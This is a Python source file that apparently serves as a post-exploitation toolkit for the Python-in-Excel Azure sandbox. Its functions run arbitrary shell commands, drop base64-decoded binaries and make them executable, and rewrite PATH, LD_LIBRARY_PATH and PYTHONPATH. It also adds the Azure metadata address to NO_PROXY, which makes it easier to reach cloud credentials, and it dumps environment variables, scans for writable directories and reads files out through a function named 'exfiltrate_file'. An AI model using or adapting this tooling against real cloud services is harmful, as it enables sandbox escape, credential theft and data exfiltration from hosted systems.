import base64
import os
import subprocess
import sys
import platform
import inspect

try:
    import pandas as pd
except ImportError:
    pass
try: # We have a local xl module that we can use to simulate the xl module in Azure for local development
    from xl import xl
except ImportError:
    pass

IS_AZURE = 'OfficePy__ComputeResourceId' in os.environ

def add_value_to_env_var(env_var_name, value, delimiter=':', location_first=True):
    '''Add a value to an environment variable'''
    env_var_value = os.environ.get(env_var_name)
    env_var_value = [] if env_var_value is None else env_var_value.split(delimiter)
    if not value in env_var_value and location_first:
        env_var_value.insert(0, value)
    if not value in env_var_value and not location_first:
        env_var_value.append( value)
    os.environ[env_var_name] = delimiter.join(env_var_value)
    return f"Added {value} to {env_var_name}"

def set_environment():
    '''Add new execution directories to the LD_LIBRARY_PATH, PATH, and PYTHONPATH environment variables'''
    HOME = os.environ.get('HOME', '/home/jovyan')
    CURDIR = get_current_directory()
    execution_directories = [HOME, CURDIR]
    execution_environment_vars = ['LD_LIBRARY_PATH', 'PATH', 'PYTHONPATH']
    for execution_directory in execution_directories:
        for env_var_name in execution_environment_vars:
            add_value_to_env_var(env_var_name, execution_directory, delimiter=':')
    response = [f"Modified environment variables: {','.join(execution_environment_vars)}: added {','.join(execution_directories)}"]
    # Add the Azure metadata service IP to the NO_PROXY environment variable
    ip_addreses = ['169.254.169.254']
    for ip_address in ip_addreses:
        add_value_to_env_var('NO_PROXY', ip_address, delimiter=',')
    response.append(f"Modified environment variable: NO_PROXY: added {','.join(ip_addreses)}")
    return response

def execute_command(command_to_execute):
    '''Execute a command and return stdout and errout combined'''
    result = subprocess.run(command_to_execute, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    # Split the output into a list of lines
    output_lines = result.stdout.splitlines()
    error_lines = result.stderr.splitlines()
    if not (bool(output_lines)) and not (bool(error_lines)):
        return None

    return output_lines + error_lines

def upload_base64_to_binary_file(base64_string, output_file_path):
    '''Convert a Base64 string to binary and write it into a file'''
    binary_data = base64.b64decode(base64_string)
    # Write the binary data to a file
    with open(output_file_path, "wb") as binary_file:
        binary_file.write(binary_data)
    print(f"Binary file '{output_file_path}' created successfully!")
    return(f"Binary file '{output_file_path}' created successfully!")

def upload_text_to_file(upload_data, output_file_path):
    '''Write text data without modification to a file'''
    with open(output_file_path, "w") as text_file:
        text_file.write(upload_data)
    print(f"Text file '{output_file_path}' created successfully!")
    return(f"Text file '{output_file_path}' created successfully!")

def get_python_launch_info():
    '''Retrieve python main and arguments'''
    self_module = [('Python main', sys.argv[0])]
    for i, arg in enumerate(sys.argv):
        if i == 0:
            continue
        self_module.append((f'arg {i}', arg))
    return self_module

def get_os_info():
    '''Retrieve operating system information'''
    os_name = platform.system()
    response = []
    version = platform.version()  # Windows version
    release = platform.release()  # Windows release (e.g., 10, 8.1, etc.)
    response += [("Operating System", f"{os_name}"), ("Version", f"{version}"), ("Release", f"{release}")]
    if os_name == "Linux":
        try:
            # For Linux systems, platform.linux_distribution() is deprecated
            # We'll use os-release or distro package for better support
            if os.path.exists('/etc/os-release'):
                with open('/etc/os-release') as f:
                    os_release_info = {}
                    for line in f:
                        key, value = line.strip().split('=', 1)
                        os_release_info[key] = value.strip('"')
                response += [("Operating System",f"{os_release_info['NAME']}"),
                              ("Version", f"{os_release_info['VERSION']}")
                              ]
            else:
                response +=  ["Operating System: Linux","Version information not found"]
        except Exception as e:
            response +=  [f"Error retrieving Linux version: {e}"]
    else: # if os_name == "Linux":
        response +=  [f"Operating System: {os_name}\nVersion: {platform.version()}"]
    return response

def get_environment_variables():
    '''Returns a list of environment variables sorted by key'''
    environment_vars = [(key,str(value)) for key,value in dict(sorted(os.environ.items(), key=lambda y: y[0].lower())).items()]
    return environment_vars

def list_installed_packages():
    '''Returns a list of installed packages sorted by package name'''
    try:
        import importlib.metadata
        installed_packages = importlib.metadata.distributions()
    except ImportError:
        installed_packages = []
    packages_list = [(package.metadata['Name'],
                      str(package.version),
                      str(package.metadata['Summary']),
                      str(package._path)
                      )
                      for package in installed_packages]
    packages_list_sorted = [(p00, p01, p02, p03 ) for p00, p01, p02, p03
                in sorted(packages_list, key=lambda y: y[0].lower())]
    return packages_list_sorted

def _list_defined_functions():
    functions_list = [(name, inspect.signature(obj), inspect.getdoc(obj)) for name, obj in globals().items() if
                 callable(obj) and obj.__name__ == name]
    functions_sorted = sorted(functions_list, key=lambda y: y[0].lower())
    return functions_sorted

def find_writable_directories(start_dir='/'):
    """Finds all directories with write access and returns them as a list."""
    writable_dirs = []
    # Walk through the directory tree
    for root, dirs, files in os.walk(start_dir, onerror=lambda e: None):
        try:
            # Check if the directory is writable
            if os.access(root, os.W_OK):
                writable_dirs.append(root)
        except Exception as e:
            continue  # Skip directories we can't access
    return writable_dirs

def get_current_directory():
    '''Get the current working directory'''
    return os.getcwd()

def make_executable(file_path, ):
    '''Make a file executable'''
    mode = 0o755
    # Change the mode of a file (default is o755)
    os.chmod(file_path, mode)
    return f"Changed mode of {file_path} to {oct(mode)}"

def convert_excel_range_to_string(dataframe):
    '''Convert a pandas dataframe from an Excel range to a string'''
    column_name = dataframe.columns[0]
    converted_string = dataframe[column_name].str.cat(sep='\n')
    return converted_string

def exfiltrate_file(file, convert_to_base64=False):
    '''Exfiltrate a file by reading it and returning its contents'''
    if convert_to_base64: # Convert the file to base64
        file_open_method = 'rb'
    else:
        file_open_method = 'r'
    with open(file, file_open_method) as f:
        raw_data = f.read()
    if convert_to_base64:
        base64_string =  base64.b64encode(raw_data).decode('utf-8')
        # Split the base64 string into lines of 76 characters, similar to Linux base64 command output
        chunk_size = 76
        data = [base64_string[i:i + chunk_size] for i in range(0, len(base64_string), chunk_size)]
    else:
        data = raw_data.splitlines()
    return data

defined_functions = _list_defined_functions()
res = [('Available functions', 'Function description')] + [(f"{name}{params}", docs if docs else '') for name, params, docs in defined_functions if name[0]!='_']
res
